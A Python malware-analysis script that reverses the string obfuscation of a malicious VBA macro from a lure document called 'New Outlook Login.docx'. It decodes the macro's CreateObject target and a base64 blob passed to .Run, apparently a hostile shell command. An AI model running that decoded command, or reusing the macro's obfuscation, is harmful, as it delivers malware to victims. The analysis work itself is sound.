#!/usr/bin/env python3
"""Decode the obfuscated VBA payload from New Outlook Login.docx.

VBA flow:
  rghArP85CL(s):
    bytes = base64_decode(s)        # standard b64
    out   = H0b8b7pLY(bytes)        # 32-bit Feistel block transform (LE)
    out   = strip_trailing("~")     # ywDJmJm1ha
    return out

  H0b8b7pLY(bytes):
    For each 4-byte group {fr+0, fr+1, fr+2, fr+3}:
      # Build 32-bit value with rotate-left semantics on each byte
      # x = WPWo1(b3,24) | WPWo1(b2,16) | WPWo1(b1,8) | b0
      # (WPWo1 is a 31-bit rotate-left, but for byte values << 24/16/8 it's just shift)
      raw = hRmz(x)
      # Then emit bytes as: low byte first, then ascending — but VBA writes "d+c+b+a"
      # where a = MSB, d = LSB → output in little-endian byte order of `raw`
      out += chr(raw & 0xFF) + chr((raw>>8)&0xFF) + chr((raw>>16)&0xFF) + chr((raw>>24)&0xFF)

  hRmz(x):  # Tiny-encryption-style Feistel inverse step
    c1 = 0x00550555  # 5570645
    c2 = 0xCCCC      # 52428
    d1 = 7
    d2 = 14
    t = (x XOR rshift(x, d2)) AND c2
    u = x XOR t XOR lshift(t, d2)
    t = (u XOR rshift(u, d1)) AND c1
    out = u XOR t XOR lshift(t, d1)

VBA WPWo1 is a 31-bit rotate-LEFT (preserves sign bit via & 0x40000000 carry); for our
byte inputs shifted by 8/16/24 it equals plain shift << within 32-bit.  b7MsjkTv3TNm is
a logical shift-RIGHT.  We model with 32-bit unsigned arithmetic.
"""
from base64 import b64decode

MASK = 0xFFFFFFFF


def rshift32(v, n):
    return (v & MASK) >> n


def lshift32(v, n):
    return ((v & MASK) << n) & MASK


def hRmz(x):
    c1 = 5570645
    c2 = 52428
    d1, d2 = 7, 14
    x &= MASK
    t = (x ^ rshift32(x, d2)) & c2
    u = x ^ t ^ lshift32(t, d2)
    t = (u ^ rshift32(u, d1)) & c1
    out = u ^ t ^ lshift32(t, d1)
    return out & MASK


def H0b8b7pLY(buf):
    out = bytearray()
    n = len(buf)
    i = 0
    while i + 4 <= n:
        b0, b1, b2, b3 = buf[i], buf[i + 1], buf[i + 2], buf[i + 3]
        # x = (b3 << 24) | (b2 << 16) | (b1 << 8) | b0
        x = (b3 << 24) | (b2 << 16) | (b1 << 8) | b0
        raw = hRmz(x)
        # Emit d,c,b,a where d=low, a=high → little-endian of raw
        out += bytes([raw & 0xFF, (raw >> 8) & 0xFF, (raw >> 16) & 0xFF, (raw >> 24) & 0xFF])
        i += 4
    return out


def rghArP85CL(s):
    raw = b64decode(s)
    blob = H0b8b7pLY(raw)
    # Strip trailing "~" bytes
    s = blob.rstrip(b"~")
    return s


# Targets from the macro:
str1 = (
    "i" + "v" + "P" + "l" + chr(-2367 + 2452) + "u" + chr(int("67")) + "4" + "d"
    + chr(int("0x68", 16)) + chr(int("0x7a", 16)) + "S" + "q" + chr(int("80"))
    + chr(1942 - 1876) + "W" + chr(int("43")) + "P" + chr(0x70) + chr(0x66) + "X"
    + chr(int("81")) + chr(int("61")) + chr(int("61"))
)
print(f"CreateObject(rghArP85CL({str1!r}))")
print(f"  -> {rghArP85CL(str1)!r}")

str2 = "uK3RX6K1WVa4LlpV4CVSF7ii8RFosWBUmKygUECl5lSIraFQSKNRV5ikoFAI8wJQAKWpUWihcVUAralRIKfEVIAtIFkK8UISgC0hWEqzUVcApalRCPV1U4ilqVEK9UJWEKSgWAL14lQApaBZKvVVEYAtIVkq4URUAK2hUQrhAlYQpKBYKuFxUYAtIVlCtddXiKWhUCjhYBAQpKBYIuHkFIAlKVhIs1dREKSgWALl01cAraFZKONRUYitoVkI81NVgC0hWQr1RhYApKBRSKVzVxCsoFhKs0ZQAKSgWULz11EApaFZCPFXEwClqVEKo0ZUgC0hWQjzdxEArKhRKqF1VQCkqFkA9/cRAKygWQD111eIraFZSuVCEoiloVAC8eJQwG3oHA=="
print(f"\n.Run rghArP85CL({str2[:40]!r}...)")
print(f"  -> {rghArP85CL(str2)!r}")
